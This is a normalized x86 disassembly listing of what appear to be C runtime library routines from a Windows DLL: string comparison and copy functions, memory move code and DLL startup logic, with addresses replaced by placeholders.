cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10040baa
call sub_1003ce41
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_100417ee
mov [ eax ] 0x22
jmp r-xdata
call sub_1003fe28
or eax 0xffffffff
sub_1003cf9b
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
push edi
call sub_100424a8
mov edi eax
mov [ esi + 0x8 ] edi
mov edx [ edi + 0x6c ]
mov [ esi ] edx
mov ecx [ edi + 0x68 ]
mov [ esi + 0x4 ] ecx
cmp edx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
pop edi
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_10041ad1
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10041e53
mov [ esi + 0x4 ] eax
sub_1003d023
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003d0b6
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
pop edi
movzx eax si
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_1003d0b6
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_1003cf9b
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1004228c
lea ecx [ ebp - 0x10 ]
movzx edi ax
movzx eax [ esi ]
lea ebx [ ebx + 0x2 ]
push ecx
push eax
call sub_1004228c
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_1003d191
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100417ee
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_100417ee
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
sub_1003d1e6
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_100417ee
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov edx edi
mov [ edi ] 0x0
test ecx ecx
je r-xdata
inc edx
dec ecx
jne r-xdata
sub edx esi
cmp [ edx ] 0x0
je r-xdata
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ edi ] cl
call sub_100417ee
push 0x22
jmp r-xdata
mov al [ esi ]
mov [ edx + esi ] al
inc esi
test al al
je r-xdata
pop edi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
sub_1003d249
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100417ee
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_100417ee
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
sub_1003d2a5
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x28
push esi
push edi
mov edi [ ebx + 0xc ]
xor eax eax
movzx ecx [ edi ]
mov [ ebp - 0x8 ] ecx
cmp ax cx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
jne r-xdata
mov eax edi
and eax 0xfff
push 0x2
pop esi
cmp eax 0xff0
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov edx [ ebx + 0x8 ]
movzx eax [ edx ]
test ax ax
je r-xdata
movzx eax cx
pxor xmm3 xmm3
mov ecx [ ebx + 0x8 ]
push 0x2
pop esi
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm4 xmm0 0x0
push 0x8
pxor xmm0 xmm0
movzx ecx cx
pop edx
movdqu xmm0 [ edi ]
jmp r-xdata
xor eax eax
and [ ebp - 0x8 ] 0x0
mov ecx eax
mov eax edx
sub eax edi
mov [ ebp - 0x4 ] eax
push 0x2
pop esi
test cx cx
je r-xdata
movzx eax [ ecx ]
xor edx edx
cmp dx ax
je r-xdata
movdqu xmm1 [ ecx ]
movdqa xmm0 xmm3
pcmpeqw xmm0 xmm1
pcmpeqw xmm1 xmm4
por xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
dec edx
jne r-xdata
add edi esi
movzx ecx [ edi ]
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x8 ]
movzx ecx [ edi ]
test cx cx
je r-xdata
movzx edx [ edi ]
cmp dx ax
jne r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
shr eax 0x1
lea ecx [ ecx + eax * 2 ]
add ecx 0x10
jmp r-xdata
movzx eax cx
psrldq xmm0 0x2
pinsrw xmm0 eax 0x7
xor eax eax
cmp ax cx
je r-xdata
mov ecx [ ebp - 0x8 ]
movzx eax [ edx ]
xor edi edi
cmp di ax
je r-xdata
movdqu xmm1 [ edx ]
pcmpistri xmm0 xmm1 0xd
jbe r-xdata
mov eax edx
jmp r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add eax esi
mov [ ebp - 0x4 ] eax
movzx ecx [ edx ]
test cx cx
jne r-xdata
movzx ecx [ eax + edi ]
movzx eax [ edi ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
jne r-xdata
add ecx esi
jmp r-xdata
mov edx ecx
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
cmp ax cx
je r-xdata
jae r-xdata
add edx 0x10
cmp [ edi ] cx
je r-xdata
add edi esi
cmp [ eax + edi ] cx
jne r-xdata
movzx eax [ edi ]
and [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x8 ] ax
je r-xdata
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebx + 0xc ]
mov edi edx
add edx esi
jmp r-xdata
pcmpistri xmm0 xmm1 0xd
lea edx [ edx + ecx * 2 ]
mov eax edx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
jmp r-xdata
mov eax ecx
jmp r-xdata
cmp [ edx ] ax
jne r-xdata
movdqu xmm2 [ edi ]
movdqu xmm1 [ edx ]
movdqa xmm0 xmm3
pcmpeqw xmm1 xmm2
pcmpeqw xmm0 xmm2
pcmpeqw xmm1 xmm3
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
movzx eax [ ecx ]
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x4 ] ax
je r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov edi [ ebx + 0xc ]
add edx esi
add edi esi
jmp r-xdata
bsf eax eax
mov [ ebp - 0x8 ] eax
and eax 0xfffffffe
add edx eax
add edi eax
add edx 0x10
add edi 0x10
jmp r-xdata
cmp [ edi ] ax
jne r-xdata
movdqu xmm1 [ edi ]
movdqu xmm2 [ ecx ]
pcmpistri xmm2 xmm1 0xd
jno r-xdata
mov eax edi
and eax 0xfff
cmp eax 0xff0
ja r-xdata
add edx esi
jmp r-xdata
add edi esi
add ecx esi
jmp r-xdata
js r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov eax edi
mov [ ebp - 0x4 ] ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
mov ecx [ ebp - 0x4 ]
add edi 0x10
add ecx 0x10
jmp r-xdata
sub_1003d538
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003d5ee
add esp 0x10
mov edi [ ebp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
dec edi
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_1003d5ee
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_1003cf9b
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebx ]
push eax
call sub_1004228c
movzx esi ax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ edi ]
push eax
call sub_1004228c
add esp 0x10
movzx eax ax
dec [ ebp + 0x10 ]
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
sub ebx edi
push 0x41
pop edx
push 0x5a
pop esi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
dec ecx
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_1003d6e7
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003d752
add esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov eax 0x7fffffff
jmp r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_100426d0
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
mov eax esi
jmp r-xdata
sub_1003d752
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
push ebx
push esi
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov edi [ ebp + 0x8 ]
mov esi 0x7fffffff
test edi edi
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
sub edi ebx
push ecx
push ebx
push edi
call sub_100426d0
add esp 0xc
mov esi eax
jmp r-xdata
sub esi eax
test esi esi
je r-xdata
cmp esi eax
je r-xdata
movzx eax [ edi + ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_10042731
lea ecx [ ebp - 0x10 ]
mov esi eax
movzx eax [ ebx ]
push ecx
push eax
call sub_10042731
add esp 0x10
inc ebx
dec [ ebp + 0x10 ]
je r-xdata
sub_1003d810
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1003d8bd
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
lea edi [ ebp - 0x1c ]
push 0x7
xor eax eax
mov [ ebp - 0x20 ] ebx
pop ecx
[ edi ]
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
mov [ ebp - 0x14 ] 0x42
call sub_1003ffb2
add esp 0x10
mov esi eax
dec [ ebp - 0x1c ]
js r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1003fe63
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
mov [ ecx ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1003d941
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_100417ee
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_100417ee
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
sub_1003d9ad
push 0x8
push r--data
call sub_1003f180
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
call sub_10042a19
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_100425e2
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
push [ rw-data ]
call sub_100431b8
pop ecx
test eax eax
jne r-xdata
dec eax
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_1004352b
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_100430ee
mov [ rw-data ] eax
call sub_10042a36
test eax eax
jns r-xdata
call sub_10042a2e
jmp r-xdata
call sub_1003f1c5
retn 0xc
xor eax eax
inc eax
push 0x0
call sub_10042472
pop ecx
push 0x3bc
push 0x1
call sub_1003f09c
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
call sub_1003ecca
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_1003edf3
call sub_10042d3c
test eax eax
js r-xdata
call sub_10042658
jmp r-xdata
push esi
push [ rw-data ]
call sub_100431d7
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003da8f
jmp r-xdata
call sub_10042cea
call sub_10042658
call sub_10042a2e
call sub_10042cea
jmp r-xdata
call sub_10042f6b
test eax eax
js r-xdata
push esi
call sub_1003f3e3
pop ecx
jmp r-xdata
push 0x0
push esi
call sub_1004252f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
call sub_1003ee02
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1003db42
push 0xc
push r--data
call sub_1003f180
xor eax eax
inc eax
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x1
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov ecx [ r--data ]
test ecx ecx
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call ecx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp + 0x10 ]
push ebx
push esi
push [ ebp + 0x8 ]
call DllMain
mov edi eax
mov [ ebp - 0x1c ] edi
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_1003d9ad
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test edi edi
jne r-xdata
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1003d9ad
neg eax
sbb eax eax
and edi eax
mov [ ebp - 0x1c ] edi
je r-xdata
cmp esi 0x3
jne r-xdata
push ebx
push eax
push [ ebp + 0x8 ]
call DllMain
push ebx
push edi
push [ ebp + 0x8 ]
call sub_1003d9ad
mov eax [ r--data ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
jmp r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call eax
call sub_1003f1c5
retn
push ebx
push esi
push [ ebp + 0x8 ]
call eax
mov edi eax
mov [ ebp - 0x1c ] edi
sub_1003dc50
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_100429fb
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_1003d9ad
sub_1003dc80
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_1003e154 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1003e058 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003e154 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1003decc ]
jmp [ ecx * 4 + jump_table_1003df4c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003dfb8 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1003e154 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1003dfb8 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003e154 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003e154 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003e154 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003dfb8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003dfb8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003dfb8 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
